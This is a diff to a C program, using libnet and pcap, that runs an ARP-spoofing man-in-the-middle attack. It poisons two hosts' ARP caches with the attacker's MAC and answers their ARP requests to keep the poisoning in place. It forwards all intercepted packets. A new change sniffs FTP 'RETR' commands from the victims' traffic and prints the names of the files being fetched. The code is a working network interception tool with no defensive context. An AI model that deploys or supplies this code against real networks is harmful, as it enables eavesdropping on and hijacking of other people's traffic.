@@ -1,7 +1,9 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <libnet.h>
 #include <pcap.h>
+#include <arpa/inet.h> // ntohs
 #include <net/ethernet.h>
 
 u_int32_t	ip_src;
@@ -101,9 +103,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
 
 	if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) // If ARP packet
 	{
-		printf("ARP packet!!\n");
 		u_int8_t opcode = (u_int8_t)*(packet_body + 14 + 7);
-		printf("opcode = %d\n", opcode);
 		if (opcode == 1) // If ARP request
 		{
 			u_int32_t target_ip = *(u_int32_t *)(packet_body + 14 + 24);
@@ -111,15 +111,13 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
 				send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);
 			if (target_ip == ip_src)
 				send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
-			printf("%x.%x.%x.%x\n", packet_body[14+24], packet_body[14+25],
-					packet_body[14+26], packet_body[14+27]);
-			printf("target_ip: %d\n", target_ip);
-			printf("o tambien: %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
 		}
 	}
 	else
 	{
-		printf("Not ARP packet!!\n");
+		if (ntohs(eth_header->ether_type) == ETHERTYPE_IP
+			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4)) // ether + ip + tcp
+			printf("Transfering: %s\n", (char *)packet_body+14+20+32+5);
 		pcap_t *handle = (pcap_t *)args;
 		pcap_inject(handle, packet_body, packet_header->caplen);
 	}
@@ -180,8 +178,10 @@ int main(int ac, char **av)
 	send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
 	send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);
 
-	pcap_t *handle = open_device("arp and arp[6:2] == 1"); // Arp request
-	/*pcap_t *handle = open_device(NULL);*/
+	printf("Listening...\n");
+
+	/*pcap_t *handle = open_device("arp and arp[6:2] == 1"); // Arp request*/
+	pcap_t *handle = open_device(NULL);
 	pcap_loop(handle, 0, packet_handler, (u_char *)handle);
 
 	pcap_close(handle);
